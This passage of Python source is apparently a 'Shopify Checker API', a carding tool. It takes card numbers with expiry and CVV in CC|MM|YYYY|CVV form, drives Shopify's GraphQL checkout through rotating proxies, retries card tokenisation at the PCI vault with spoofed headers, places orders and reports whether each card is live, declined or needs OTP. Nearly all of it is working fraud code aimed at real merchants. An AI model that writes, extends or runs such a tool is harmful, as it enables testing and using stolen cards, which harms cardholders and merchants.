                for method in payment_data.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        break

            if not payment_identifier:
                return False, "No valid payment method", gateway, total_price, currency, proxy_ok

            # delivery proposal
            delivery_op = get_operation_name(QUERY_PROPOSAL_DELIVERY) or "Proposal"
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["operationName"] = delivery_op

            if requires_shipping:
                delivery_line = {
                    "destination": {"streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone,
                    }},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy or "",
                            "customDeliveryRate": False,
                        },
                        "options": {"phone": phone},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stableId}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                    "destinationChanged": False,
                }
                delivery_input = {
                    "deliveryLines": [delivery_line],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }
            else:
                delivery_input = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stableId}],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }

            json_data["variables"]["delivery"] = delivery_input
            json_data["variables"]["payment"]["billingAddress"] = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": firstName, "lastName": lastName,
                "zoneCode": state, "phone": phone,
            }}
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            try:
                delivery_text, _ = await make_graphql_request(json_data)
            except Exception as e:
                proxy_ok = False
                return False, f"Delivery proposal error: {str(e)}", gateway, total_price, currency, proxy_ok

            if is_captcha_required(delivery_text):
                return False, "CAPTCHA_REQUIRED on delivery", gateway, total_price, currency, proxy_ok

            try:
                delivery_json = json.loads(delivery_text)
            except Exception:
                return False, "Invalid JSON in delivery proposal", gateway, total_price, currency, proxy_ok

            if "errors" in delivery_json:
                return False, f"Delivery proposal error: {delivery_json['errors']}", gateway, total_price, currency, proxy_ok

            delivery_result = delivery_json.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
            if not delivery_result or delivery_result.get("__typename") != "NegotiationResultAvailable":
                return False, "No valid result from delivery proposal", gateway, total_price, currency, proxy_ok

            if delivery_result.get("queueToken"):
                queueToken = delivery_result["queueToken"]
            if delivery_result.get("checkpointData"):
                checkpoint_data = delivery_result["checkpointData"]

            delivery_seller = delivery_result.get("sellerProposal", {})
            if not delivery_seller:
                return False, "No seller proposal from delivery", gateway, total_price, currency, proxy_ok

            payment_data_final = delivery_seller.get("payment", {})
            if payment_data_final and payment_data_final.get("__typename") == "FilledPaymentTerms":
                for method in payment_data_final.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        break

            payment_stable_id = None
            payment_special_instructions = None
            payment_due_at = None
            payment_lines = delivery_seller.get("payment", {}).get("paymentLines", [])
            if payment_lines:
                fp = payment_lines[0]
                payment_stable_id = fp.get("stableId")
                payment_special_instructions = fp.get("specialInstructions")
                payment_due_at = fp.get("dueAt")

            merchandise_stable_id = None
            merchandise_total = None
            merch_lines = delivery_seller.get("merchandise", {}).get("merchandiseLines", [])
            if merch_lines:
                merchandise_stable_id = merch_lines[0].get("stableId")
                merchandise_total = merch_lines[0].get("totalAmount", {}).get("value", {}).get("amount")

            if requires_shipping:
                seller_delivery = delivery_seller.get("delivery", {})
                if seller_delivery.get("__typename") == "FilledDeliveryTerms":
                    dlines = seller_delivery.get("deliveryLines", [{}])
                    if dlines:
                        selected_handle = dlines[0].get("selectedDeliveryStrategy", {}).get("handle")
                        available = dlines[0].get("availableDeliveryStrategies", [])
                        if selected_handle:
                            for strat in available:
                                if strat.get("handle") == selected_handle:
                                    shipping_amount = float(strat.get("amount", {}).get("value", {}).get("amount", "0"))
                                    break
                            else:
                                if available:
                                    shipping_amount = float(available[0].get("amount", {}).get("value", {}).get("amount", "0"))
                        elif available:
                            shipping_amount = float(available[0].get("amount", {}).get("value", {}).get("amount", "0"))

                        if selected_handle:
                            delivery_input["deliveryLines"][0]["selectedDeliveryStrategy"]["deliveryStrategyByHandle"]["handle"] = selected_handle

                        seller_expected_price = dlines[0].get("expectedTotalPrice", {})
                        if seller_expected_price:
                            if shipping_amount == 0.0:
                                shipping_amount = 0.01
                            delivery_input["deliveryLines"][0]["expectedTotalPrice"] = {
                                "value": {"amount": str(shipping_amount), "currencyCode": currency}
                            }
                        else:
                            delivery_input["deliveryLines"][0]["expectedTotalPrice"] = {"any": True}

                if merchandise_stable_id:
                    delivery_input["deliveryLines"][0]["targetMerchandiseLines"]["lines"][0]["stableId"] = merchandise_stable_id
                delivery_input["deliveryLines"][0]["destinationChanged"] = False
            else:
                if merchandise_stable_id:
                    delivery_input["noDeliveryRequired"][0]["stableId"] = merchandise_stable_id

            final_total = None
            for field in ("checkoutTotal", "total", "runningTotal"):
                val = delivery_seller.get(field, {})
                if val and val.get("__typename") in ("MoneyValue", "MoneyValueConstraint"):
                    amount = val.get("value", {}).get("amount") or val.get("amount")
                    if amount is not None:
                        final_total = str(amount)
                        currency = val.get("value", {}).get("currencyCode") or val.get("currencyCode") or currency
                        break
            if final_total is None:
                merch_total = merchandise_total or subtotal
                shipping = "0"
                if requires_shipping and "expectedTotalPrice" in delivery_input["deliveryLines"][0]:
                    exp = delivery_input["deliveryLines"][0]["expectedTotalPrice"]
                    if "value" in exp:
                        shipping = exp["value"].get("amount", "0")
                tax = delivery_seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
                final_total = str(Decimal(str(merch_total)) + Decimal(str(shipping)) + Decimal(str(tax)))

            if float(final_total) <= 0:
                final_total = str(max(0.01, float(merchandise_total or subtotal)))

            # PCI vault
            payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv,
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urlparse(ourl).netloc,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": headers["User-Agent"],
                "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            token = None
            strategies = [
                {"payload": payload, "headers": vault_headers, "proxy": proxy_url},
                {"payload": {**payload, "credit_card": {**payload["credit_card"], "number": re.sub(r"\s", "", cc)}}, "headers": vault_headers, "proxy": proxy_url},
                {"payload": payload, "headers": {**vault_headers, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"}, "proxy": proxy_url},
                {"payload": payload, "headers": vault_headers, "proxy": None},
                {"payload": payload, "headers": {**vault_headers, "Accept": "application/vnd.shopify.pci.v1+json"}, "proxy": proxy_url},
            ]
            for strat in strategies:
                try:
                    async with session.post(
                        "https://checkout.pci.shopifyinc.com/sessions",
                        json=strat["payload"], headers=strat["headers"],
                        proxy=strat["proxy"], timeout=8,
                    ) as vault_resp:
                        if vault_resp.status in (200, 201):
                            vd = await vault_resp.json()
                            token = vd.get("id")
                            if token:
                                logger.info("pci token ok")
                                break
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    if proxy_url is not None:
                        proxy_ok = False
                    continue
                except Exception:
                    continue

            if not token:
                return False, "Unable to get payment token", gateway, attempted_price, currency, proxy_ok

            # submit
            submit_merch = {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id or stableId,
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                    }},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": str(merchandise_total or subtotal), "currencyCode": currency}},
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }]
            }

            payment_method = {
                "directPaymentMethod": {
                    "paymentMethodIdentifier": payment_identifier,
                    "sessionId": token,
                    "billingAddress": {"streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone,
                    }},
                    "cardSource": None,
                }
            }

            payment_line = {
                "paymentMethod": payment_method,
                "amount": {"value": {"amount": final_total, "currencyCode": currency}},
                "dueAt": payment_due_at,
            }
            if payment_stable_id:
                payment_line["stableId"] = payment_stable_id
            if payment_special_instructions:
                payment_line["specialInstructions"] = payment_special_instructions

            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": delivery_input,
                    "merchandise": submit_merch,
                    "payment": {
                        "totalAmount": {"value": {"amount": final_total, "currencyCode": currency}},
                        "paymentLines": [payment_line],
                        "billingAddress": {"streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone,
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            submit_op = get_operation_name(MUTATION_SUBMIT) or "SubmitForCompletion"
            submit_json = {
                "query": MUTATION_SUBMIT,
                "variables": submit_variables,
                "operationName": submit_op,
            }
            if use_persisted and persisted_id:
                submit_json["id"] = persisted_id
                submit_json.pop("query", None)

            try:
                submit_text, _ = await make_graphql_request(submit_json)
            except Exception as e:
                proxy_ok = False
                return False, f"Submit error: {str(e)}", gateway, attempted_price, currency, proxy_ok

            if is_captcha_required(submit_text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, attempted_price, currency, proxy_ok

            try:
                submit_result = json.loads(submit_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON in submit: {str(e)}", gateway, attempted_price, currency, proxy_ok

            if "errors" in submit_result:
                err = submit_result["errors"][0]
                code = err.get("extensions", {}).get("code", "")
                msg = err.get("message", "")
                return False, f"GRAPHQL_ERROR: {code} - {msg}", gateway, attempted_price, currency, proxy_ok

            submit_data = submit_result.get("data", {}).get("submitForCompletion", {})
            if not submit_data:
                return False, "No submit data", gateway, attempted_price, currency, proxy_ok

            result_type = submit_data.get("__typename", "")

            if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = submit_data.get("receipt") or submit_data.get("order", {}).get("receipt")
                rid = receipt.get("id") if receipt else None
                if not rid:
                    order = submit_data.get("order") or submit_data.get("purchaseOrder")
                    if order:
                        rid = order.get("id") or order.get("checkoutId")
                    if not rid:
                        return False, "No receipt ID", gateway, attempted_price, currency, proxy_ok
                purchase_order = submit_data.get("purchaseOrder", {})
                total_amount = purchase_order.get("totalAmountToPay", {})
                if total_amount:
                    total_price = total_amount.get("amount", "0.00")
                    currency = total_amount.get("currencyCode", currency)
                else:
                    total_price = final_total

            elif result_type == "SubmitFailed":
                reason = submit_data.get("reason", "Unknown")
                return False, extract_clean_response(reason), gateway, attempted_price, currency, proxy_ok
            elif result_type == "SubmitRejected":
                errors = submit_data.get("errors", [])
                if errors:
                    code = errors[0].get("code", "")
                    return False, code if code else "SUBMIT_REJECTED", gateway, attempted_price, currency, proxy_ok
                return False, "SUBMIT_REJECTED", gateway, attempted_price, currency, proxy_ok
            elif result_type in ("Throttled", "CheckpointDenied"):
                return False, result_type, gateway, attempted_price, currency, proxy_ok
            else:
                return False, f"Unknown submit type: {result_type}", gateway, attempted_price, currency, proxy_ok

            # poll
            poll_op = get_operation_name(QUERY_POLL) or "PollForReceipt"
            poll_json = {
                "query": QUERY_POLL,
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": poll_op,
            }
            if use_persisted and persisted_id:
                poll_json["id"] = persisted_id
                poll_json.pop("query", None)

            poll_attempts = 0
            poll_data = {}
            while poll_attempts < 8:
                if poll_attempts > 0:
                    delay = None
                    if poll_data and poll_data.get("__typename") in ("ProcessingReceipt", "WaitingReceipt"):
                        delay = poll_data.get("pollDelay", 450) / 1000.0
                    if delay is None:
                        delay = min(0.5 * (2 ** (poll_attempts - 1)), 4.0)
                    await asyncio.sleep(max(0.2, min(delay, 0.8) if delay else 0.5))

                try:
                    poll_text, _ = await make_graphql_request(poll_json)
                except Exception as e:
                    proxy_ok = False
                    return False, f"Poll error: {str(e)}", gateway, total_price, currency, proxy_ok

                if is_captcha_required(poll_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency, proxy_ok

                try:
                    poll_data = json.loads(poll_text).get("data", {}).get("receipt", {})
                    typename = poll_data.get("__typename", "")

                    if typename == "ProcessedReceipt":
                        return True, random.choice(["Order Confirm", "ORDER_PAID"]), gateway, total_price, currency, proxy_ok
                    elif typename == "FailedReceipt":
                        error = poll_data.get("processingError", {})
                        if error.get("__typename") == "PaymentFailed":
                            code = error.get("code", "")
                            msg = error.get("messageUntranslated", "")
                            if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                return True, msg, gateway, total_price, currency, proxy_ok
                            return True, code if code else "CARD_DECLINED", gateway, total_price, currency, proxy_ok
                        return True, "FAILED", gateway, total_price, currency, proxy_ok
                    elif typename == "ActionRequiredReceipt":
                        return True, "OTP_REQUIRED", gateway, total_price, currency, proxy_ok
                    elif typename in ("ProcessingReceipt", "WaitingReceipt"):
                        poll_attempts += 1
                        continue
                    else:
                        poll_attempts += 1
                        continue
                except Exception:
                    poll_attempts += 1
                    continue

            return False, "Poll timeout", gateway, total_price, currency, proxy_ok

    except Exception as e:
        logger.error(f"checkout error: {e}")
        logger.error(traceback.format_exc())
        return False, f"Error Processing Card: {str(e)}", gateway, attempted_price, currency, proxy_ok


# =====================================================================
# FLASK
# =====================================================================
app = Flask(__name__)


def pretty_jsonify(data):
    return app.response_class(
        response=json.dumps(data, indent=2, ensure_ascii=False),
        status=200,
        mimetype="application/json",
    )


@app.before_request
def _attach_request_id():
    g.request_id = request.headers.get("X-Request-Id") or uuid.uuid4().hex[:12]
    g.started = time.time()


@app.after_request
def _log_request(resp):
    logger.info("req done", extra={"request_id": getattr(g, "request_id", ""),
                                   "site": request.args.get("site", "")})
    resp.headers["X-Request-Id"] = getattr(g, "request_id", "")
    return resp


@app.route("/shopify", methods=["GET"])
def shopify_checker():
    start_time = time.time()
    _increment_active()
    try:
        site = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")
        variant = request.args.get("variant")

        if not site or not cc_string:
            return pretty_jsonify({"error": "Missing parameters", "status": False}), 400

        try:
            parts = cc_string.split("|")
            if len(parts) != 4:
                raise ValueError("Invalid format. Use: CC|MM|YYYY|CVV")
            cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        except ValueError as e:
            return pretty_jsonify({"error": str(e), "status": False}), 400

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, price, currency, proxy_ok = loop.run_until_complete(
                asyncio.wait_for(
                    process_card(cc, mes, ano, cvv, site, variant, proxy_str),
                    timeout=int(os.getenv("REQUEST_TIMEOUT", "90")),
                )
            )
        except asyncio.TimeoutError:
            return pretty_jsonify({
                "CC": cc_string, "Currency": "USD", "Gateway": "Shopify",
                "Price": "0.00", "Proxy": "live" if proxy_str else "none",
                "Response": "TIMEOUT", "Status": False,
                "Time": f"{time.time() - start_time:.2f}s",
            })
        finally:
            loop.close()

        clean = extract_clean_response(message)
        elapsed = time.time() - start_time

        if not proxy_str:
            proxy_status = "none"
        elif proxy_ok:
            proxy_status = "live"
        else:
            proxy_status = "dead"

        response = {
            "CC": cc_string,
            "Currency": currency,
            "Gateway": gateway,
            "Price": str(price) if price else "0.00",
            "Proxy": proxy_status,
            "Response": clean,
            "Status": success,
            "Time": f"{elapsed:.2f}s",
            "RequestId": g.request_id,
        }
        logger.info(f"response: {response}")
        return pretty_jsonify(response)

    except Exception as e:
        logger.exception("request error")
        elapsed = time.time() - start_time
        proxy_status = "dead" if any(k in str(e).lower() for k in ("proxy", "connection", "timeout", "refused")) else "unknown"
        if not request.args.get("proxy"):
            proxy_status = "none"
        return pretty_jsonify({
            "CC": request.args.get("cc", ""),
            "Currency": "USD",
            "Gateway": "UNKNOWN",
            "Price": "0.00",
            "Proxy": proxy_status,
            "Response": f"ERROR: {str(e)}",
            "Status": False,
            "Time": f"{elapsed:.2f}s",
            "RequestId": getattr(g, "request_id", ""),
        }), 500
    finally:
        _decrement_active()


@app.route("/health", methods=["GET"])
def health():
    with _metrics_lock:
        active = _active_checkouts
    return pretty_jsonify({
        "status": "ok",
        "active_checkouts": active,
        "socks": HAS_SOCKS,
        "cached_sites": len(_variant_cache),
        "time": time.time(),
    })


@app.route("/", methods=["GET"])
def index():
    with _metrics_lock:
        active = _active_checkouts
    return pretty_jsonify({
        "name": "Shopify Checker API (reference-style, modern)",
        "endpoint": "/shopify?site=URL&cc=CC|MM|YYYY|CVV&proxy=PROXY",
        "active_checkouts": active,
        "features": [
            "GraphQL-first product fetch with REST pagination",
            "Persisted GraphQL endpoint support",
            "CheckpointData propagation",
            "Dynamic poll delays from pollDelay",
            "PCI vault fallback strategies (5 attempts)",
            "requiresShipping detection",
            "Variant cache with TTL",
            "Primary domain resolution",
            "Multi-scheme proxy support (http/https/socks4/socks5)",
            "Request IDs + rotating logs + JSON logging option",
            "Retry on NO_RESPONSE / No products found",
        ],
    })


if __name__ == "__main__":
    logger.info(f"starting on {os.getenv('HOST', '0.0.0.0')}:{int(os.getenv('PORT', '8073'))}")
    if not HAS_SOCKS:
        logger.warning("aiohttp_socks missing — socks proxies will fall back to http")
    app.run(host=os.getenv("HOST", "0.0.0.0"), port=int(os.getenv("PORT", "8073")),
            debug=os.getenv("DEBUG", "false").lower() in ("1", "true", "yes"))
